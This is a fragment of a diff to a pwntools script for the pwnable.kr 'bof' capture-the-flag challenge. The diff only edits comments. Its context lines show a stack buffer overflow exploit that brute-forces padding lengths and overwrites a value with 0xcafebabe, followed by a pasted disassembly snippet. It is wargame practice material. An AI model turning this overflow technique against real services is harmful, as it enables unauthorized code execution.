@@ -2,7 +2,7 @@
 #This contains two methods. First One is Brute-Force ! Second One is actual Way
 from pwn import *
 
-
+#This contains two solution :) 
 for i in range(32,133):
         p= remote("pwnable.kr","9000")
         p.sendline("A"*i+"\xca\xfe\xba\xbe"[::-1])
@@ -17,7 +17,7 @@ for i in range(32,133):
                 break
                 
                 
-#Right Solution Without Bruteforce                
+#Right Solution Without Bruteforce  --------------------------------------- :) Pro Hacker               
                         lea    eax,[ebp-0x2c]
    0x0000064c <+32>:    mov    DWORD PTR [esp],eax
    0x0000064f <+35>:    call   0x650 <func+36>
